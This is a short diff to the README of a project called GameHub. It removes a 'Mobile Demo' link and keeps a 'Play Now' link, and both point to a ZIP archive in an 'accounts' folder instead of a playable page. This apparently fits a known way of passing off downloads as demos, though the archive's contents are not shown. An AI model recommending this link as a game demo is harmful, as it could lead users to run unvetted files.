@@ -67,8 +67,6 @@ In an era of complex game engines and heavy frameworks, GameHub proves that amaz
 ## 🚀 Demo
 
 - **[Play Now](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)**
-- **[Mobile Demo](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)**
-
 ***
 
 ## ✨ Features
